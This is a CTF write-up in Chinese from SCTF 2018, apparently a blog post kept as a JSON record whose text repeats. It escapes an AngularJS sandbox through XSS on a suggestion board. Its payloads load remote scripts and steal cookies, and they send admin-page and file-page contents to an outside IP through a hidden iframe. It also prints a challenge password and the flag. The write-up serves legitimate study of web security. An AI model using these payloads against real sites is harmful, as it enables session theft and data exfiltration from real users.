cookie里边并没有flag，并且给的地址为本地地址，并不在公网上。\n\n6. 获取`/admin`的内容\n\n   ```\n   JC5nZXRTY3JpcHQoJ2h0dHA6Ly8xMjMuMjA3LjkwLjE0My9zdS5qcycpCg==\n   =>\n   $.getScript('http://123.207.90.143/su.js')\n   ```\n\n   ```\n   {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };eval(atob(\\'JC5nZXRTY3JpcHQoJ2h0dHA6Ly8xMjMuMjA3LjkwLjE0My9zdS5qcycpCg==\\'))//');}}\n   ```\n\n7. su.js内容即paylaod如下：\n\n   ```\n   $.ajax({\n       url: \"/admin\",\n       type: \"GET\",\n       dataType: \"text\",\n       success: function(result) {\n           var code = btoa(encodeURIComponent(result));\n           xssPost('http://123.207.90.143', code);\n       },\n       error: function(msg) {\n   \n       }\n   })\n   \n   function xssPost(url, postStr) {\n       var de;\n       de = document.body.appendChild(document.createElement('iframe'));\n       de.src = 'about:blank';\n       de.height = 1;\n       de.width = 1;\n       de.contentDocument.write('<form method=\"GET\" action=\"' + url + '\"><input name=\"code\" value=\"' + postStr + '\"/></form>');\n       de.contentDocument.forms[0].submit();\n       de.style.display = 'none';\n   }\n   ```\n\n8. admin内容如下:\n\n   ```\n   JTBEJTBBJTNDIURPQ1RZUEUlMjBodG1sJTNFJTBEJTBBJTNDaHRtbCUyMGxhbmclM0QlMjJ6aC1DTiUyMiUzRSUwRCUwQSUyMCUyMCUzQ2hlYWQlM0UlMEQlMEElMjAlMjAlMjAlMjAlM0NtZXRhJTIwY2hhcnNldCUzRCUyMnV0Zi04JTIyJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTNDbWV0YSUyMGh0dHAtZXF1aXYlM0QlMjJYLVVBLUNvbXBhdGlibGUlMjIlMjBjb250ZW50JTNEJTIySUUlM0RlZGdlJTIyJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTNDbWV0YSUyMG5hbWUlM0QlMjJ2aWV3cG9ydCUyMiUyMGNvbnRlbnQlM0QlMjJ3aWR0aCUzRGRldmljZS13aWR0aCUyQyUyMGluaXRpYWwtc2NhbGUlM0QxJTIyJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTNDIS0tJTIwJUU0JUI4JThBJUU4JUJGJUIwMyVFNCVCOCVBQW1ldGElRTYlQTAlODclRTclQUQlQkUqJUU1JUJGJTg1JUU5JUExJUJCKiVFNiU5NCVCRSVFNSU5QyVBOCVFNiU5QyU4MCVFNSU4OSU4RCVFOSU5RCVBMiVFRiVCQyU4QyVFNCVCQiVCQiVFNCVCRCU5NSVFNSU4NSVCNiVFNCVCQiU5NiVFNSU4NiU4NSVFNSVBRSVCOSVFOSU4MyVCRColRTUlQkYlODUlRTklQTElQkIqJUU4JUI3JTlGJUU5JTlBJThGJUU1JTg1JUI2JUU1JTkwJThFJUVGJUJDJTgxJTIwLS0lM0UlMEQlMEElMjAlMjAlMjAlMjAlM0NtZXRhJTIwbmFtZSUzRCUyMmRlc2NyaXB0aW9uJTIyJTIwY29udGVudCUzRCUyMiUyMiUzRSUwRCUwQSUyMCUyMCUyMCUyMCUzQ21ldGElMjBuYW1lJTNEJTIyYXV0aG9yJTIyJTIwY29udGVudCUzRCUyMiUyMiUzRSUwRCUwQSUyMCUyMCUyMCUyMCUzQ2xpbmslMjByZWwlM0QlMjJpY29uJTIyJTIwaHJlZiUzRCUyMiUyMiUzRSUwRCUwQSUwRCUwQSUyMCUyMCUyMCUyMCUzQ3RpdGxlJTNFU1lDJTNDJTJGdGl0bGUlM0UlMEQlMEElMEQlMEElMEQlMEElMjAlMjAlMjAlMjAlM0NsaW5rJTIwaHJlZiUzRCUyMmh0dHBzJTNBJTJGJTJGY2RuLmJvb3Rjc3MuY29tJTJGYm9vdHN0cmFwJTJGMy4zLjclMkZjc3MlMkZib290c3RyYXAubWluLmNzcyUyMiUyMHJlbCUzRCUyMnN0eWxlc2hlZXQlMjIlM0UlMEQlMEElMjAlMjAlMjAlMjAlM0NsaW5rJTIwaHJlZiUzRCUyMmNzcyUyRmllMTAtdmlld3BvcnQtYnVnLXdvcmthcm91bmQuY3NzJTIyJTIwcmVsJTNEJTIyc3R5bGVzaGVldCUyMiUzRSUwRCUwQSUyMCUyMCUyMCUyMCUzQ2xpbmslMjBocmVmJTNEJTIyY3NzJTJGc3RhcnRlci10ZW1wbGF0ZS5jc3MlMjIlMjByZWwlM0QlMjJzdHlsZXNoZWV0JTIyJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTNDc3R5bGUlMjB0eXBlJTNEJTIydGV4dCUyRmNzcyUyMiUzRSUwRCUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMGJvZHklMjAlN0IlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjBwYWRkaW5nLXRvcCUzQSUyMDYwcHglM0IlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjBwYWRkaW5nLWJvdHRvbSUzQSUyMDQwcHglM0IlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlN0QlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlM0MlMkZzdHlsZSUzRSUwRCUwQSUwRCUwQSUyMCUyMCUyMCUyMCUzQ3NjcmlwdCUyMHNyYyUzRCUyMmh0dHBzJTNBJTJGJTJGY2RuLmJvb3Rjc3MuY29tJTJGYW5ndWxhci5qcyUyRjEuNC42JTJGYW5ndWxhci5taW4uanMlMjIlM0UlM0MlMkZzY3JpcHQlM0UlMEQlMEElMjAlMjAlMjAlMjAlM0NzY3JpcHQlMjBzcmMlM0QlMjJodHRwcyUzQSUyRiUyRmFwcHMuYmRpbWcuY29tJTJGbGlicyUyRmFuZ3VsYXItcm91dGUlMkYxLjMuMTMlMkZhbmd1bGFyLXJvdXRlLmpzJTIyJTNFJTNDJTJGc2NyaXB0JTNFJTBEJTBBJTIwJTIwJTIwJTIwJTNDc2NyaXB0JTIwc3JjJTNEJTIyanMlMkZpZS1lbXVsYXRpb24tbW9kZXMtd2FybmluZy5qcyUyMiUzRSUzQyUyRnNjcmlwdCUzRSUwRCUwQSUwRCUwQSUyMCUyMCUzQyUyRmhlYWQlM0UlMEQlMEElMEQlMEElMjAlMjAlM0Nib2R5JTIwJTNFJTBEJTBBJTBEJTBBJTIwJTIwJTIwJTIwJTNDbmF2JTIwY2xhc3MlM0QlMjJuYXZiYXIlMjBuYXZiYXItaW52ZXJzZSUyMG5hdmJhci1maXhlZC10b3AlMjIlM0UlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlM0NkaXYlMjBjbGFzcyUzRCUyMmNvbnRhaW5lciUyMiUzRSUwRCUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUzQ2RpdiUyMGNsYXNzJTNEJTIybmF2YmFyLWhlYWRlciUyMiUzRSUwRCUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUzQ2J1dHRvbiUyMHR5cGUlM0QlMjJidXR0b24lMjIlMjBjbGFzcyUzRCUyMm5hdmJhci10b2dnbGUlMjBjb2xsYXBzZWQlMjIlMjBkYXRhLXRvZ2dsZSUzRCUyMmNvbGxhcHNlJTIyJTIwZGF0YS10YXJnZXQlM0QlMjIlMjNuYXZiYXIlMjIlMjBhcmlhLWV4cGFuZGVkJTNEJTIyZmFsc2UlMjIlMjBhcmlhLWNvbnRyb2xzJTNEJTIybmF2YmFyJTIyJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDc3BhbiUyMGNsYXNzJTNEJTIyc3Itb25seSUyMiUzRVRvZ2dsZSUyMG5hdmlnYXRpb24lM0MlMkZzcGFuJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDc3BhbiUyMGNsYXNzJTNEJTIyaWNvbi1iYXIlMjIlM0UlM0MlMkZzcGFuJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDc3BhbiUyMGNsYXNzJTNEJTIyaWNvbi1iYXIlMjIlM0UlM0MlMkZzcGFuJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDc3BhbiUyMGNsYXNzJTNEJTIyaWNvbi1iYXIlMjIlM0UlM0MlMkZzcGFuJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDJTJGYnV0dG9uJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDYSUyMGNsYXNzJTNEJTIybmF2YmFyLWJyYW5kJTIyJTIwaHJlZiUzRCUyMiUyRiUyMiUzRVNZQyUyMEFETUlOJTNDJTJGYSUzRSUwRCUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUzQyUyRmRpdiUzRSUwRCUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUzQ2RpdiUyMGlkJTNEJTIybmF2YmFyJTIyJTIwY2xhc3MlM0QlMjJjb2xsYXBzZSUyMG5hdmJhci1jb2xsYXBzZSUyMiUzRSUwRCUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUzQ3VsJTIwY2xhc3MlM0QlMjJuYXYlMjBuYXZiYXItbmF2JTIyJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDbGklMjBjbGFzcyUzRCUyMmFjdGl2ZSUyMiUzRSUzQ2ElMjBocmVmJTNEJTIyJTIzJTIyJTNFSG9tZSUzQyUyRmElM0UlM0MlMkZsaSUzRSUwRCUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUzQ2xpJTNFJTNDYSUyMGhyZWYlM0QlMjIlMjMlMjIlM0UlRTYlOTclQTUlRTUlQkYlOTclM0MlMkZhJTNFJTNDJTJGbGklM0UlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlM0NsaSUzRSUzQ2ElMjBocmVmJTNEJTIyJTIzJTIyJTNFJUU4JUI0JUE2JUU1JThEJTk1JTNDJTJGYSUzRSUzQyUyRmxpJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDbGklM0UlM0NhJTIwaHJlZiUzRCUyMmFkbWluJTJGZmlsZSUyMiUzRSVFNiU5NiU4NyVFNCVCQiVCNiUzQyUyRmElM0UlM0MlMkZsaSUzRSUwRCUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUzQ2xpJTNFJTNDYSUyMGhyZWYlM0QlMjJhZG1pbiUyRnN1Z2dlc3QlMjIlM0UlRTclOTUlOTklRTglQTglODAlM0MlMkZhJTNFJTNDJTJGbGklM0UlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlM0NsaSUzRSUzQ2ElMjBocmVmJTNEJTIyJTIzJTIyJTNFJUU1JThGJTkxJUU1JUI4JTgzJTNDJTJGYSUzRSUzQyUyRmxpJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDJTJGdWwlM0UlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlM0MlMkZkaXYlM0UlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlM0MlMkZkaXYlM0UlMEQlMEElMjAlMjAlMjAlMjAlM0MlMkZuYXYlM0UlMEQlMEElMEQlMEElMEQlMEElM0NkaXYlMjBjbGFzcyUzRCUyMmNvbnRhaW5lciUyMiUzRSUwRCUwQSUyMCUyMCUzQ2RpdiUyMGNsYXNzJTNEJTIyanVtYm90cm9uJTIyJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDaDElM0VIRUxMTyUyMGFkbWluQ2xvdW5kJTNDJTJGaDElM0UlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlM0NwJTNFJUU2JTk2JUIwJUU3JTg5JTg4JUU1JTkwJThFJUU1JThGJUIwMi4wISUzQyUyRnAlM0UlMEQlMEElMjAlMjAlM0MlMkZkaXYlM0UlMEQlMEElM0MlMkZkaXYlM0UlMEQlMEElMEQlMEElMEQlMEElMjAlMjAlMjAlMjAlM0MhLS0lMjBCb290c3RyYXAlMjBjb3JlJTIwSmF2YVNjcmlwdCUwRCUwQSUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUyMC0tJTNFJTBEJTBBJTNDIS0tJTIwUGxhY2VkJTIwYXQlMjB0aGUlMjBlbmQlMjBvZiUyMHRoZSUyMGRvY3VtZW50JTIwc28lMjB0aGUlMjBwYWdlcyUyMGxvYWQlMjBmYXN0ZXIlMjAtLSUzRSUwRCUwQSUzQ3NjcmlwdCUyMHNyYyUzRCUyMmh0dHBzJTNBJTJGJTJGY2RuLmJvb3Rjc3MuY29tJTJGanF1ZXJ5JTJGMS4xMi40JTJGanF1ZXJ5Lm1pbi5qcyUyMiUzRSUzQyUyRnNjcmlwdCUzRSUwRCUwQSUzQ3NjcmlwdCUyMHNyYyUzRCUyMmh0dHBzJTNBJTJGJTJGY2RuLmJvb3Rjc3MuY29tJTJGYm9vdHN0cmFwJTJGMy4zLjclMkZqcyUyRmJvb3RzdHJhcC5taW4uanMlMjIlM0UlM0MlMkZzY3JpcHQlM0UlMEQlMEElM0MhLS0lMjBJRTEwJTIwdmlld3BvcnQlMjBoYWNrJTIwZm9yJTIwU3VyZmFjZSUyRmRlc2t0b3AlMjBXaW5kb3dzJTIwOCUyMGJ1ZyUyMC0tJTNFJTBEJTBBJTNDc2NyaXB0JTIwc3JjJTNEJTIyanMlMkZpZTEwLXZpZXdwb3J0LWJ1Zy13b3JrYXJvdW5kLmpzJTIyJTNFJTNDJTJGc2NyaXB0JTNFJTBEJTBBJTBEJTBBJTNDJTJGYm9keSUzRSUwRCUwQSUzQyUyRmh0bWwlM0UlMEQlMEElMEQlMEE%3D\n   ```\n\n   解码后:\n\n   ```\n   <!DOCTYPE html>\n   <html lang=\"zh-CN\">\n     <head>\n       <meta charset=\"utf-8\">\n       <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n       <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n       <!-- 上述3个meta标签*必须*放在最前面，任何其他内容都*必须*跟随其后！ -->\n       <meta name=\"description\" content=\"\">\n       <meta name=\"author\" content=\"\">\n       <link rel=\"icon\" href=\"\">\n   \n       <title>SYC</title>\n   \n   \n       <link href=\"https://cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.min.css\" rel=\"stylesheet\">\n       <link href=\"css/ie10-viewport-bug-workaround.css\" rel=\"stylesheet\">\n       <link href=\"css/starter-template.css\" rel=\"stylesheet\">\n       <style type=\"text/css\">\n             body {\n               padding-top: 60px;\n               padding-bottom: 40px;\n             }\n           </style>\n   \n       <script src=\"https://cdn.bootcss.com/angular.js/1.4.6/angular.min.js\"></script>\n       <script src=\"https://apps.bdimg.com/libs/angular-route/1.3.13/angular-route.js\"></script>\n       <script src=\"js/ie-emulation-modes-warning.js\"></script>\n   \n     </head>\n   \n     <body >\n   \n       <nav class=\"navbar navbar-inverse navbar-fixed-top\">\n         <div class=\"container\">\n           <div class=\"navbar-header\">\n             <button type=\"button\" class=\"navbar-toggle collapsed\" data-toggle=\"collapse\" data-target=\"#navbar\" aria-expanded=\"false\" aria-controls=\"navbar\">\n               <span class=\"sr-only\">Toggle navigation</span>\n               <span class=\"icon-bar\"></span>\n               <span class=\"icon-bar\"></span>\n               <span class=\"icon-bar\"></span>\n             </button>\n             <a class=\"navbar-brand\" href=\"/\">SYC ADMIN</a>\n           </div>\n           <div id=\"navbar\" class=\"collapse navbar-collapse\">\n             <ul class=\"nav navbar-nav\">\n               <li class=\"active\"><a href=\"#\">Home</a></li>\n               <li><a href=\"#\">日志</a></li>\n               <li><a href=\"#\">账单</a></li>\n               <li><a href=\"admin/file\">文件</a></li>\n               <li><a href=\"admin/suggest\">留言</a></li>\n               <li><a href=\"#\">发布</a></li>\n             </ul>\n           </div>\n         </div>\n       </nav>\n   \n   \n   <div class=\"container\">\n     <div class=\"jumbotron\">\n           <h1>HELLO adminClound</h1>\n           <p>新版后台2.0!</p>\n     </div>\n   </div>\n   \n   \n       <!-- Bootstrap core JavaScript\n   ================================================== -->\n   <!-- Placed at the end of the document so the pages load faster -->\n   <script src=\"https://cdn.bootcss.com/jquery/1.12.4/jquery.min.js\"></script>\n   <script src=\"https://cdn.bootcss.com/bootstrap/3.3.7/js/bootstrap.min.js\"></script>\n   <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->\n   <script src=\"js/ie10-viewport-bug-workaround.js\"></script>\n   \n   </body>\n   </html>\n   ```\n\n9. 获取`admin/file`，需要登录\n\n   ```\n   <div class=\"container\">\n     <form method=\"post\">\n       <label for=\"filePasswd\" class=\"sr-only\">输入文件密码</label>\n       <input type=\"text\" id=\"filePasswd\" class=\"form-control\" placeholder=\"filepasswd\" required=\"\" autofocus=\"\" name=\"filepasswd\">\n       <button class=\"btn btn-lg btn-primary btn-block\" type=\"submit\">提交</button>\n     </form>\n   </div>\n   ```\n\n10. 我们发现新的用户\n\n  ```\n  adminClound\n  ```\n\n  结合路由:\n\n  ```\n  http://116.62.137.114:4879/api/memos/admintest2313\n  ```\n\n  访问`http://116.62.137.114:4879/api/memos/adminClound`\n\n  得到`adminClound`的密码:`HGf^&39NsslUIf^23`\n\n11. 登录`admin/file`\n\n    paylaod如下：\n\n    ```\n    $.ajax({\n        url: \"/admin/file\",\n        type: \"POST\",\n        data: \"filepasswd=HGf%5E%2639NsslUIf%5E23\",\n        dataType: \"text\",\n        success: function(result) {\n            var code = btoa(encodeURIComponent(result));\n            xssPost('http://123.207.90.143', code);\n        },\n        error: function(msg) {\n    \n        }\n    })\n    \n    function xssPost(url, postStr) {\n        var de;\n        de = document.body.appendChild(document.createElement('iframe'));\n        de.src = 'about:blank';\n        de.height = 1;\n        de.width = 1;\n        de.contentDocument.write('<form method=\"GET\" action=\"' + url + '\"><input name=\"code\" value=\"' + postStr + '\"/></form>');\n        de.contentDocument.forms[0].submit();\n        de.style.display = 'none';\n    }\n    \n    ```\n\n    得到flag:`sctf{T4is_is_f1ag2313}`。","source":"_posts/sctf2018.md","raw":"---\ntitle: sctf2018\ndate: 2018-06-21 09:59:01\ntags:\npassword: 123456\n---\n\n<!--more-->\n\n# 新的建议板\n\n1. 基础payload\n\n   ```js\n   {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };eval(alert(1))//');}}\n   ```\n\n2. 打cookie\n\n   ```js\n   {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };eval(atob(\\'JC5nZXRTY3JpcHQoJ2h0dHBzOi8veHNzcHQuY29tL0hNVHpNUycpCg==\\'))//');}}\n   ```\n\n3. 调用script\n\n   使用\n\n   > $.getScript('https://xsspt.com/HMTzMS')\n\n   > base64一下: `JC5nZXRTY3JpcHQoJ2h0dHBzOi8veHNzcHQuY29tL0hNVHpNUycpCg==`\n\n4. 这样就可以拿到cookie\n\n   接收到的内容如下:\n\n   ```\n   location : http://127.0.0.1:1002/admin/suggest?suggest=%7B%7B'a'.constructor.prototype.charAt=[].join;$eval('x=1%7D%20%7D%20%7D;eval(atob(%5C'JC5nZXRTY3JpcHQoJ2h0dHBzOi8veHNzcHQuY29tL0hNVHpNUycpCg==%5C'))//');%7D%7D\n   ```\n\n5. cookie里边并没有flag，并且给的地址为本地地址，并不在公网上。\n\n6. 获取`/admin`的内容\n\n   ```\n   JC5nZXRTY3JpcHQoJ2h0dHA6Ly8xMjMuMjA3LjkwLjE0My9zdS5qcycpCg==\n   =>\n   $.getScript('http://123.207.90.143/su.js')\n   ```\n\n   ```\n   {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };eval(atob(\\'JC5nZXRTY3JpcHQoJ2h0dHA6Ly8xMjMuMjA3LjkwLjE0My9zdS5qcycpCg==\\'))//');}}\n   ```\n\n7. su.js内容即paylaod如下：\n\n   ```\n   $.ajax({\n       url: \"/admin\",\n       type: \"GET\",\n       dataType: \"text\",\n       success: function(result) {\n           var code = btoa(encodeURIComponent(result));\n           xssPost('http://123.207.90.143', code);\n       },\n       error: function(msg) {\n   \n       }\n   })\n   \n   function xssPost(url, postStr) {\n       var de;\n       de = document.body.appendChild(document.createElement('iframe'));\n       de.src = 'about:blank';\n       de.height = 1;\n       de.width = 1;\n       de.contentDocument.write('<form method=\"GET\" action=\"' + url + '\"><input name=\"code\" value=\"' + postStr + '\"/></form>');\n       de.contentDocument.forms[0].submit();\n       de.style.display = 'none';\n   }\n   ```\n\n8. admin内容如下:\n\n   ```\n   JTBEJTBBJTNDIURPQ1RZUEUlMjBodG1sJTNFJTBEJTBBJTNDaHRtbCUyMGxhbmclM0QlMjJ6aC1DTiUyMiUzRSUwRCUwQSUyMCUyMCUzQ2hlYWQlM0UlMEQlMEElMjAlMjAlMjAlMjAlM0NtZXRhJTIwY2hhcnNldCUzRCUyMnV0Zi04JTIyJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTNDbWV0YSUyMGh0dHAtZXF1aXYlM0QlMjJYLVVBLUNvbXBhdGlibGUlMjIlMjBjb250ZW50JTNEJTIySUUlM0RlZGdlJTIyJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTNDbWV0YSUyMG5hbWUlM0QlMjJ2aWV3cG9ydCUyMiUyMGNvbnRlbnQlM0QlMjJ3aWR0aCUzRGRldmljZS13aWR0aCUyQyUyMGluaXRpYWwtc2NhbGUlM0QxJTIyJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTNDIS0tJTIwJUU0JUI4JThBJUU4JUJGJUIwMyVFNCVCOCVBQW1ldGElRTYlQTAlODclRTclQUQlQkUqJUU1JUJGJTg1JUU5JUExJUJCKiVFNiU5NCVCRSVFNSU5QyVBOCVFNiU5QyU4MCVFNSU4OSU4RCVFOSU5RCVBMiVFRiVCQyU4QyVFNCVCQiVCQiVFNCVCRCU5NSVFNSU4NSVCNiVFNCVCQiU5NiVFNSU4NiU4NSVFNSVBRSVCOSVFOSU4MyVCRColRTUlQkYlODUlRTklQTElQkIqJUU4JUI3JTlGJUU5JTlBJThGJUU1JTg1JUI2JUU1JTkwJThFJUVGJUJDJTgxJTIwLS0lM0UlMEQlMEElMjAlMjAlMjAlMjAlM0NtZXRhJTIwbmFtZSUzRCUyMmRlc2NyaXB0aW9uJTIyJTIwY29udGVudCUzRCUyMiUyMiUzRSUwRCUwQSUyMCUyMCUyMCUyMCUzQ21ldGElMjBuYW1lJTNEJTIyYXV0aG9yJTIyJTIwY29udGVudCUzRCUyMiUyMiUzRSUwRCUwQSUyMCUyMCUyMCUyMCUzQ2xpbmslMjByZWwlM0QlMjJpY29uJTIyJTIwaHJlZiUzRCUyMiUyMiUzRSUwRCUwQSUwRCUwQSUyMCUyMCUyMCUyMCUzQ3RpdGxlJTNFU1lDJTNDJTJGdGl0bGUlM0UlMEQlMEElMEQlMEElMEQlMEElMjAlMjAlMjAlMjAlM0NsaW5rJTIwaHJlZiUzRCUyMmh0dHBzJTNBJTJGJTJGY2RuLmJvb3Rjc3MuY29tJTJGYm9vdHN0cmFwJTJGMy4zLjclMkZjc3MlMkZib290c3RyYXAubWluLmNzcyUyMiUyMHJlbCUzRCUyMnN0eWxlc2hlZXQlMjIlM0UlMEQlMEElMjAlMjAlMjAlMjAlM0NsaW5rJTIwaHJlZiUzRCUyMmNzcyUyRmllMTAtdmlld3BvcnQtYnVnLXdvcmthcm91bmQuY3NzJTIyJTIwcmVsJTNEJTIyc3R5bGVzaGVldCUyMiUzRSUwRCUwQSUyMCUyMCUyMCUyMCUzQ2xpbmslMjBocmVmJTNEJTIyY3NzJTJGc3RhcnRlci10ZW1wbGF0ZS5jc3MlMjIlMjByZWwlM0QlMjJzdHlsZXNoZWV0JTIyJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTNDc3R5bGUlMjB0eXBlJTNEJTIydGV4dCUyRmNzcyUyMiUzRSUwRCUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMGJvZHklMjAlN0IlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjBwYWRkaW5nLXRvcCUzQSUyMDYwcHglM0IlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjBwYWRkaW5nLWJvdHRvbSUzQSUyMDQwcHglM0IlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlN0QlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlM0MlMkZzdHlsZSUzRSUwRCUwQSUwRCUwQSUyMCUyMCUyMCUyMCUzQ3NjcmlwdCUyMHNyYyUzRCUyMmh0dHBzJTNBJTJGJTJGY2RuLmJvb3Rjc3MuY29tJTJGYW5ndWxhci5qcyUyRjEuNC42JTJGYW5ndWxhci5taW4uanMlMjIlM0UlM0MlMkZzY3JpcHQlM0UlMEQlMEElMjAlMjAlMjAlMjAlM0NzY3JpcHQlMjBzcmMlM0QlMjJodHRwcyUzQSUyRiUyRmFwcHMuYmRpbWcuY29tJTJGbGlicyUyRmFuZ3VsYXItcm91dGUlMkYxLjMuMTMlMkZhbmd1bGFyLXJvdXRlLmpzJTIyJTNFJTNDJTJGc2NyaXB0JTNFJTBEJTBBJTIwJTIwJTIwJTIwJTNDc2NyaXB0JTIwc3JjJTNEJTIyanMlMkZpZS1lbXVsYXRpb24tbW9kZXMtd2FybmluZy5qcyUyMiUzRSUzQyUyRnNjcmlwdCUzRSUwRCUwQSUwRCUwQSUyMCUyMCUzQyUyRmhlYWQlM0UlMEQlMEElMEQlMEElMjAlMjAlM0Nib2R5JTIwJTNFJTBEJTBBJTBEJTBBJTIwJTIwJTIwJTIwJTNDbmF2JTIwY2xhc3MlM0QlMjJuYXZiYXIlMjBuYXZiYXItaW52ZXJzZSUyMG5hdmJhci1maXhlZC10b3AlMjIlM0UlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlM0NkaXYlMjBjbGFzcyUzRCUyMmNvbnRhaW5lciUyMiUzRSUwRCUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUzQ2RpdiUyMGNsYXNzJTNEJTIybmF2YmFyLWhlYWRlciUyMiUzRSUwRCUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUzQ2J1dHRvbiUyMHR5cGUlM0QlMjJidXR0b24lMjIlMjBjbGFzcyUzRCUyMm5hdmJhci10b2dnbGUlMjBjb2xsYXBzZWQlMjIlMjBkYXRhLXRvZ2dsZSUzRCUyMmNvbGxhcHNlJTIyJTIwZGF0YS10YXJnZXQlM0QlMjIlMjNuYXZiYXIlMjIlMjBhcmlhLWV4cGFuZGVkJTNEJTIyZmFsc2UlMjIlMjBhcmlhLWNvbnRyb2xzJTNEJTIybmF2YmFyJTIyJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDc3BhbiUyMGNsYXNzJTNEJTIyc3Itb25seSUyMiUzRVRvZ2dsZSUyMG5hdmlnYXRpb24lM0MlMkZzcGFuJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDc3BhbiUyMGNsYXNzJTNEJTIyaWNvbi1iYXIlMjIlM0UlM0MlMkZzcGFuJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDc3BhbiUyMGNsYXNzJTNEJTIyaWNvbi1iYXIlMjIlM0UlM0MlMkZzcGFuJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDc3BhbiUyMGNsYXNzJTNEJTIyaWNvbi1iYXIlMjIlM0UlM0MlMkZzcGFuJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDJTJGYnV0dG9uJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDYSUyMGNsYXNzJTNEJTIybmF2YmFyLWJyYW5kJTIyJTIwaHJlZiUzRCUyMiUyRiUyMiUzRVNZQyUyMEFETUlOJTNDJTJGYSUzRSUwRCUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUzQyUyRmRpdiUzRSUwRCUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUzQ2RpdiUyMGlkJTNEJTIybmF2YmFyJTIyJTIwY2xhc3MlM0QlMjJjb2xsYXBzZSUyMG5hdmJhci1jb2xsYXBzZSUyMiUzRSUwRCUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUzQ3VsJTIwY2xhc3MlM0QlMjJuYXYlM